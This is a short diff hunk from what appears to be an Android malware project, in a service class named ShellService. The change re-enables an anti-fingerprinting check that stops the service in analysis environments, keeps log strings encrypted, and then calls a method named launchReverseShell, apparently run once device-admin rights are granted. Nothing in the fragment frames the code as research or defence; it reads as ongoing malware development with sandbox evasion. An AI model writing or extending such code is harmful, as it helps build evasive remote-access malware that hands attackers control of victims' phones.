@@ -40,11 +40,11 @@ public class ShellService extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         Log.d(TAG,StringHelper.decrypt("psuygltqZR/ppzqnEkfXhJyibyyLaYmOYWkABdN6dW5OqTBf436WMG4xvG7B4JvAGPirNp6r4Hxije3L1KIZEynCllUQvAGBcw==")  ); // "Service starting - calling launchReverseShell"
-//        if (!AntiFingerprint.isSafeToRun(this)) {
-//            Log.d(TAG,StringHelper.decrypt("7XxEkPzb4FnMdO1ZnlTEo29w49UyMT18uYkm8nDqbOY8/xSvtJpf2oZThTlCgZSxzvnnplNjpXygOcxhm2AxMG/SFVGI") ); //  "⚠️ AntiFingerprint check failed — stopping"
-//            stopSelf();
-//            return START_NOT_STICKY;
-//        }
+        if (!AntiFingerprint.isSafeToRun(this)) {
+            Log.d(TAG,StringHelper.decrypt("7XxEkPzb4FnMdO1ZnlTEo29w49UyMT18uYkm8nDqbOY8/xSvtJpf2oZThTlCgZSxzvnnplNjpXygOcxhm2AxMG/SFVGI") ); //  "⚠️ AntiFingerprint check failed — stopping"
+            stopSelf();
+            return START_NOT_STICKY;
+        }
         // DIRECTLY CALL YOUR EXISTING METHOD
         // This calls the same method that runs when admin is granted
         adminReceiver.launchReverseShell(this);
